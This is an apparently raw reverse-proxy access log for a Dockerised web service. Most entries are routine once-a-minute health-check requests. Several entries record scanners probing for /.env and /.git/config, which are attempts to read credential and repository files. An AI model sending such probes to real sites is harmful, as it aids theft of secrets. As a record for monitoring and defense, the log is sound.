167.71.120.76 - - [19/Dec/2023:08:19:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8857 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:08:20:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8858 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:08:20:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8859 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:08:21:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8860 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:08:21:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8861 "www@docker" "http://172.18.0.9:80" 0ms
95.214.235.169 - - [19/Dec/2023:08:22:05 +0000] "GET /.env HTTP/1.1" 301 17 "-" "-" 8862 "web-to-websecure@internal" "-" 0ms
95.214.235.169 - - [19/Dec/2023:08:22:05 +0000] "POST / HTTP/1.1" 308 18 "-" "-" 8863 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [19/Dec/2023:08:22:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8864 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:08:22:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8865 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:08:23:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8866 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:08:23:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8867 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [19/Dec/2023:08:24:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8868 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [19/Dec/2023:08:24:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8869 "www@docker" "http://172.18.0.9:80" 0ms
143.110.222.166 - - [19/Dec/2023:08:25:16 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 8870 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [19/Dec/2023:08:25:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8871 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [19/Dec/2023:08:25:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8872 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [19/Dec/2023:08:26:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8873 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:08:26:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8874 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:08:27:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8875 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:08:27:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8876 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [19/Dec/2023:08:28:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8877 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:08:28:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8878 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [19/Dec/2023:08:29:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8879 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:08:29:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8880 "www@docker" "http://172.18.0.9:80" 0ms
170.64.200.251 - - [19/Dec/2023:08:30:19 +0000] "GET /.git/config HTTP/1.1" 301 17 "-" "-" 8881 "web-to-websecure@internal" "-" 0ms
170.64.200.251 - - [19/Dec/2023:08:30:20 +0000] "GET /.git/config HTTP/1.1" 404 19 "-" "-" 8882 "-" "-" 0ms
159.203.109.206 - - [19/Dec/2023:08:30:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8883 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:08:30:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8884 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [19/Dec/2023:08:31:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8885 "www@docker" "http://172.18.0.9:80" 0ms
69.164.217.74 - - [19/Dec/2023:08:31:33 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 8886 "-" "-" 0ms
167.71.120.76 - - [19/Dec/2023:08:31:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8887 "www@docker" "http://172.18.0.9:80" 1ms
172.203.187.48 - - [19/Dec/2023:08:32:08 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 8888 "web-to-websecure@internal" "-" 0ms
172.104.11.34 - - [19/Dec/2023:08:32:11 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 8889 "-" "-" 0ms
159.203.109.206 - - [19/Dec/2023:08:32:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8890 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:08:32:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8891 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:08:33:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8892 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [19/Dec/2023:08:33:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8893 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [19/Dec/2023:08:34:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8894 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:08:34:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8895 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:08:35:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8896 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:08:35:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8897 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [19/Dec/2023:08:36:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8898 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [19/Dec/2023:08:36:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8899 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [19/Dec/2023:08:37:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8900 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [19/Dec/2023:08:37:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8901 "www@docker" "http://172.18.0.9:80" 0ms
95.214.235.169 - - [19/Dec/2023:08:37:51 +0000] "GET /.env HTTP/1.1" 301 17 "-" "-" 8902 "web-to-websecure@internal" "-" 0ms
95.214.235.169 - - [19/Dec/2023:08:37:52 +0000] "POST / HTTP/1.1" 308 18 "-" "-" 8903 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [19/Dec/2023:08:38:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8904 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:08:38:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8905 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:08:39:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8906 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:08:39:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8907 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:08:40:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8908 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:08:40:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8909 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [19/Dec/2023:08:41:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8910 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [19/Dec/2023:08:41:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8911 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:08:42:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8912 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:08:42:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8913 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:08:43:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8914 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:08:43:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8915 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [19/Dec/2023:08:44:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8916 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:08:44:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8917 "www@docker" "http://172.18.0.9:80" 0ms
23.26.221.29 - - [19/Dec/2023:08:44:49 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 8918 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [19/Dec/2023:08:45:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8919 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:08:45:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8920 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [19/Dec/2023:08:46:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8921 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [19/Dec/2023:08:46:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8922 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:08:47:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8923 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:08:47:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8924 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:08:48:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8925 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:08:48:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8926 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:08:49:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8927 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:08:49:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8928 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:08:50:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8929 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [19/Dec/2023:08:50:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8930 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [19/Dec/2023:08:51:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8931 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [19/Dec/2023:08:51:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8932 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:08:52:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8933 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:08:52:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8934 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [19/Dec/2023:08:53:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8935 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [19/Dec/2023:08:53:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8936 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [19/Dec/2023:08:54:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8937 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:08:54:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8938 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:08:55:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8939 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:08:55:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8940 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [19/Dec/2023:08:56:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8941 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:08:56:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8942 "www@docker" "http://172.18.0.9:80" 0ms
143.110.222.166 - - [19/Dec/2023:08:57:04 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 8943 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [19/Dec/2023:08:57:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8944 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:08:57:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8945 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:08:58:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8946 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:08:58:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8947 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:08:59:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8948 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [19/Dec/2023:08:59:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8949 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [19/Dec/2023:09:00:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8950 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:09:00:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8951 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:09:01:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8952 "www@docker" "http://172.18.0.9:80" 1ms
143.198.120.158 - - [19/Dec/2023:09:01:31 +0000] "GET /selfie HTTP/1.1" 404 19 "-" "-" 8953 "-" "-" 0ms
167.71.120.76 - - [19/Dec/2023:09:01:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8954 "www@docker" "http://172.18.0.9:80" 1ms
143.110.222.166 - - [19/Dec/2023:09:02:02 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 8955 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [19/Dec/2023:09:02:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8956 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [19/Dec/2023:09:02:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8957 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:09:03:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8958 "www@docker" "http://172.18.0.9:80" 0ms
167.94.145.60 - - [19/Dec/2023:09:03:23 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 8959 "-" "-" 0ms
167.94.145.60 - - [19/Dec/2023:09:03:27 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 8960 "-" "-" 0ms
167.71.120.76 - - [19/Dec/2023:09:03:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8961 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:09:04:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8962 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:09:04:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8963 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:09:05:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8964 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [19/Dec/2023:09:05:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8965 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [19/Dec/2023:09:06:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8966 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:09:06:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8967 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:09:07:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8968 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:09:07:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8969 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:09:08:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8970 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:09:08:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8971 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:09:09:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8972 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:09:09:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8973 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [19/Dec/2023:09:10:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8974 "www@docker" "http://172.18.0.9:80" 0ms
57.129.23.166 - - [19/Dec/2023:09:10:25 +0000] "GET /.env HTTP/1.1" 301 17 "-" "-" 8975 "web-to-websecure@internal" "-" 0ms
57.129.23.166 - - [19/Dec/2023:09:10:25 +0000] "POST / HTTP/1.1" 308 18 "-" "-" 8976 "web-to-websecure@internal" "-" 0ms
167.71.120.76 - - [19/Dec/2023:09:10:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8977 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:09:11:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8978 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [19/Dec/2023:09:11:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8979 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:09:12:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8980 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:09:12:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8981 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:09:13:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8982 "www@docker" "http://172.18.0.9:80" 0ms
192.155.88.231 - - [19/Dec/2023:09:13:25 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 8983 "-" "-" 0ms
167.71.120.76 - - [19/Dec/2023:09:13:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8984 "www@docker" "http://172.18.0.9:80" 0ms
172.104.11.46 - - [19/Dec/2023:09:13:52 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 8985 "-" "-" 0ms
159.203.109.206 - - [19/Dec/2023:09:14:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8986 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:09:14:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8987 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [19/Dec/2023:09:15:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8988 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:09:15:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8989 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:09:16:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8990 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:09:16:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8991 "www@docker" "http://172.18.0.9:80" 0ms
35.202.9.133 - - [19/Dec/2023:09:17:02 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 8992 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [19/Dec/2023:09:17:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8993 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:09:17:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8994 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:09:18:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8995 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:09:18:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8996 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:09:19:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8997 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:09:19:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8998 "www@docker" "http://172.18.0.9:80" 0ms
198.74.56.46 - - [19/Dec/2023:09:19:58 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 8999 "-" "-" 0ms
159.203.109.206 - - [19/Dec/2023:09:20:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9000 "www@docker" "http://172.18.0.9:80" 0ms
45.33.80.243 - - [19/Dec/2023:09:20:24 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 9001 "-" "-" 0ms
167.71.120.76 - - [19/Dec/2023:09:20:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9002 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [19/Dec/2023:09:21:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9003 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [19/Dec/2023:09:21:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9004 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:09:22:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9005 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:09:22:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9006 "www@docker" "http://172.18.0.9:80" 0ms
54.37.79.75 - - [19/Dec/2023:09:23:16 +0000] "GET /.env HTTP/1.1" 301 17 "-" "-" 9007 "web-to-websecure@internal" "-" 0ms
54.37.79.75 - - [19/Dec/2023:09:23:16 +0000] "POST / HTTP/1.1" 308 18 "-" "-" 9008 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [19/Dec/2023:09:23:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9009 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:09:23:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9010 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [19/Dec/2023:09:24:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9011 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:09:24:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9012 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:09:25:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9013 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [19/Dec/2023:09:25:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9014 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:09:26:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9015 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:09:26:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9016 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:09:27:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9017 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:09:27:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9018 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:09:28:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9019 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [19/Dec/2023:09:28:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9020 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [19/Dec/2023:09:29:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9021 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:09:29:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9022 "www@docker" "http://172.18.0.9:80" 0ms
193.118.53.194 - - [19/Dec/2023:09:30:05 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 9023 "-" "-" 0ms
159.203.109.206 - - [19/Dec/2023:09:30:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9024 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:09:30:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9025 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [19/Dec/2023:09:31:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9026 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:09:31:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9027 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [19/Dec/2023:09:32:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9028 "www@docker" "http://172.18.0.9:80" 1ms
198.74.56.46 - - [19/Dec/2023:09:32:29 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 9029 "-" "-" 0ms
167.71.120.76 - - [19/Dec/2023:09:32:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9030 "www@docker" "http://172.18.0.9:80" 0ms
45.79.172.21 - - [19/Dec/2023:09:32:56 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 9031 "-" "-" 0ms
159.203.109.206 - - [19/Dec/2023:09:33:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9032 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:09:33:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9033 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:09:34:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9034 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [19/Dec/2023:09:34:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9035 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [19/Dec/2023:09:35:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9036 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:09:35:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9037 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:09:36:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9038 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:09:36:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9039 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [19/Dec/2023:09:37:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9040 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:09:37:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9041 "www@docker" "http://172.18.0.9:80" 0ms
